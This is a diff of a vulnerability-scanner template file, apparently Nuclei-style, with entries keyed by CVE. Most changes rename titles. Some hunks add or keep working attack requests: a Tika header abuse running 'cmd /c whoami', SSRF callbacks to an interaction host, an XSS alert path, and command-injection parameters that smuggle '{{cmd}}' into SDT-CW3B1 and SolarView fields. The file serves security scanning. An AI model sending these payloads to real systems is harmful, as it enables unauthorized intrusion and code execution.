@@ -6300,11 +6300,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -9280,8 +9280,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -13944,7 +13944,7 @@
     {
       "id": "CVE-2021-25281",
       "info": {
-        "name": "SaltStack wheel_async unauth access",
+        "name": "SaltStack Salt <3002.5 - Auth Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -13987,7 +13987,7 @@
     {
       "id": "CVE-2021-26084",
       "info": {
-        "name": "Confluence Server OGNL injection - RCE",
+        "name": "Confluence Server - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -14046,7 +14046,7 @@
     {
       "id": "CVE-2021-26295",
       "info": {
-        "name": "Apache OFBiz RMI Deserialization - Remote Code Execution",
+        "name": "Apache OFBiz <17.12.06 - Arbitrary Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -14149,7 +14149,7 @@
     {
       "id": "CVE-2021-27132",
       "info": {
-        "name": "CRLF Injection - Sercomm VD625",
+        "name": "Sercomm VD625 Smart Modems - CRLF Injection",
         "severity": "critical"
       },
       "requests": [
@@ -14208,7 +14208,7 @@
     {
       "id": "CVE-2021-27561",
       "info": {
-        "name": "YeaLink DM PreAuth RCE",
+        "name": "YeaLink DM 3.6.0.20 - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -14223,7 +14223,7 @@
     {
       "id": "CVE-2021-27651",
       "info": {
-        "name": "Pega Infinity Authentication bypass",
+        "name": "Pega Infinity - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -14238,7 +14238,7 @@
     {
       "id": "CVE-2021-27850",
       "info": {
-        "name": "Apache Tapestry - Arbitrary class download",
+        "name": "Apache Tapestry - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -14253,7 +14253,7 @@
     {
       "id": "CVE-2021-27905",
       "info": {
-        "name": "Apache Solr <= 8.8.1 SSRF",
+        "name": "Apache Solr <=8.8.1 - Server-Side Request Forgery",
         "severity": "critical"
       },
       "requests": [
@@ -14268,7 +14268,7 @@
     {
       "id": "CVE-2021-27931",
       "info": {
-        "name": "LumisXP Blind XXE",
+        "name": "LumisXP <10.0.0 - Blind XML External Entity Attack",
         "severity": "critical"
       },
       "requests": [
@@ -14404,7 +14404,7 @@
     {
       "id": "CVE-2021-28918",
       "info": {
-        "name": "Netmask NPM Package SSRF",
+        "name": "Netmask NPM Package - Server-Side Request Forgery",
         "severity": "critical"
       },
       "requests": [
@@ -14453,7 +14453,7 @@
     {
       "id": "CVE-2021-29203",
       "info": {
-        "name": "HPE Edgeline Infrastructure Manager v1.21 Authentication Bypass",
+        "name": "HPE Edgeline Infrastructure Manager <1.22 - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -14468,7 +14468,7 @@
     {
       "id": "CVE-2021-29441",
       "info": {
-        "name": "Nacos prior to 1.4.1 Authentication Bypass",
+        "name": "Nacos <1.4.1 - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -14648,7 +14648,7 @@
     {
       "id": "CVE-2021-30461",
       "info": {
-        "name": "VoipMonitor Pre-Auth-RCE",
+        "name": "VoipMonitor <24.61 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -14710,7 +14710,7 @@
     {
       "id": "CVE-2021-3129",
       "info": {
-        "name": "Laravel <= v8.4.2 Debug Mode - Remote Code Execution",
+        "name": "Laravel with Ignition <= v8.4.2 Debug Mode - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -14833,7 +14833,7 @@
     {
       "id": "CVE-2021-31856",
       "info": {
-        "name": "Layer5 Meshery 0.5.2 SQLi",
+        "name": "Layer5 Meshery 0.5.2 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -14877,7 +14877,7 @@
     {
       "id": "CVE-2021-32172",
       "info": {
-        "name": "Maian Cart 3.8 preauth RCE",
+        "name": "Maian Cart <=3.8 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -14909,7 +14909,7 @@
     {
       "id": "CVE-2021-32305",
       "info": {
-        "name": "Websvn 2.6.0 - Remote Code Execution (Unauthenticated)",
+        "name": "Websvn <2.6.1 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -15048,7 +15048,7 @@
     {
       "id": "CVE-2021-33221",
       "info": {
-        "name": "CommScope Ruckus IoT Controller Unauthenticated Service Details",
+        "name": "CommScope Ruckus IoT Controller - Information Disclosure",
         "severity": "critical"
       },
       "requests": [
@@ -15063,7 +15063,7 @@
     {
       "id": "CVE-2021-33357",
       "info": {
-        "name": "RaspAP <= 2.6.5 - Remote Code Execution",
+        "name": "RaspAP <=2.6.5 - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -15092,7 +15092,7 @@
     {
       "id": "CVE-2021-33564",
       "info": {
-        "name": "Argument Injection in Ruby Dragonfly",
+        "name": "Ruby Dragonfly <1.4.0 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -15138,7 +15138,7 @@
     {
       "id": "CVE-2021-3378",
       "info": {
-        "name": "FortiLogger Unauthenticated Arbitrary File Upload",
+        "name": "FortiLogger 4.4.2.2 - Arbitrary File Upload",
         "severity": "critical"
       },
       "requests": [
@@ -15384,7 +15384,7 @@
     {
       "id": "CVE-2021-36356",
       "info": {
-        "name": "Kramer VIAware RCE",
+        "name": "Kramer VIAware - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -15850,6 +15850,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/Ajax_url_encode.php?link_url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-40822",
+      "info": {
+        "name": "Geoserver - SSRF",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /geoserver/TestWfsPost HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nform_hf_0=&url=http://{{interactsh-url}}/geoserver/../&body=&username=&password=\n"
           ]
         }
       ]
@@ -16755,6 +16769,21 @@
       ]
     },
     {
+      "id": "CVE-2021-46379",
+      "info": {
+        "name": "D-Link DIR850 ET850-1.08TRb03 - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/boafrm/formWlanRedirect?redirect-url=http://example.com&wlan_id=1"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-46381",
       "info": {
         "name": "D-Link DAP-1620 - Local File Inclusion",
@@ -16801,9 +16830,24 @@
       ]
     },
     {
+      "id": "CVE-2021-46422",
+      "info": {
+        "name": "SDT-CW3B1 1.1.0 - OS Command Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/admin.cgi?Command=sysCommand&Cmd={{cmd}}"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-46424",
       "info": {
-        "name": "TLR-2005KSH - Arbitrary File Delete",
+        "name": "Telesquare TLR-2005KSH 1.0.0 - Arbitrary File Delete",
         "severity": "critical"
       },
       "requests": [
@@ -17062,7 +17106,7 @@
     {
       "id": "CVE-2022-0482",
       "info": {
-        "name": "Easy!Appointments Broken Access Control",
+        "name": "Easy!Appointments <1.4.3 - Broken Access Control",
         "severity": "critical"
       },
       "requests": [
@@ -17077,7 +17121,7 @@
     {
       "id": "CVE-2022-0540",
       "info": {
-        "name": "Atlassian Jira Seraph- Authentication Bypass",
+        "name": "Atlassian Jira Seraph - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -17092,7 +17136,7 @@
     {
       "id": "CVE-2022-0543",
       "info": {
-        "name": "Redis Sandbox Escape RCE",
+        "name": "Redis Sandbox Escape - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -17107,7 +17151,7 @@
     {
       "id": "CVE-2022-0591",
       "info": {
-        "name": "Formcraft3 < 3.8.28 - Unauthenticated SSRF",
+        "name": "Formcraft3 <3.8.28 - Server-Side Request Forgery",
         "severity": "critical"
       },
       "requests": [
@@ -17167,7 +17211,7 @@
     {
       "id": "CVE-2022-1020",
       "info": {
-        "name": "Woo Product Table < 3.1.2 - Unauthenticated Arbitrary Function Call",
+        "name": "WordPress WooCommerce <3.1.2 - Arbitrary Function Call",
         "severity": "critical"
       },
       "requests": [
@@ -17787,6 +17831,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/goforms/rlminfo"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29303",
+      "info": {
+        "name": "SolarView Compact 6.0 - OS Command Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /conf_mail.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nmail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M\n"
           ]
         }
       ]
